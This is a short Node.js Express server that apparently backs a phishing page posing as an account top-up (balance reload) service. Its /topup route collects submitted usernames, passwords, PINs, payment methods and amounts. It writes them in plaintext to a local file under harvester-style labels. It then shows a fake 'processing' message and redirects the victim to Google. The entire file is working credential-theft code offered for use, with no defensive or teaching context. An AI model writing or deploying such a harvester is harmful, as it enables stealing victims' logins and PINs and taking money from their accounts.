const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/topup', (req, res) => {
  const { username, password, pin, metode, nominal } = req.body;
  const log = `
[+] WAKTU : ${new Date().toISOString()}
[+] USER  : ${username}
[+] PASS  : ${password}
[+] PIN   : ${pin || '-'}
[+] METODE: ${metode}
[+] NOMINAL: ${nominal}
----------------------------------------\n`;
  fs.appendFileSync('hasil.txt', log);
  res.send(`<h2>⏳ PROSES...</h2><script>setTimeout(()=>{ window.location.href='https://google.com'; }, 5000);</script>`);
});

app.listen(PORT, () => console.log(`🔥 RUNNING ON PORT ${PORT}`));
